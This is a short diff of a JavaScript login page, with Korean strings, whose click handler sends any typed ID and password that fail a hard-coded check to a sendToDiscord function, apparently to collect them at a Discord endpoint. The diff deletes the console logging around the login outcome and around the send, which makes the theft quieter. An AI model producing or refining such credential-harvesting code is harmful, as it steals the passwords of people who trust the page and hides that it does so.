@@ -19,10 +19,8 @@ inputPassword.addEventListener("keyup", () => {
 
 ordinaryButton.addEventListener('click', () => {
     if (inputId.value === "본인의아이디" && inputPassword.value === "비밀번호") {
-        console.log("로그인 성공");
     } else {
         sendToDiscord(inputId.value, inputPassword.value);
-        console.log("로그인 실패");
     }
 });
 
@@ -47,9 +45,7 @@ function sendToDiscord(userId, password) {
         return response.json();
     })
     .then(data => {
-        console.log('성공:', data);
     })
     .catch((error) => {
-        console.error('오류:', error);
     });
 }
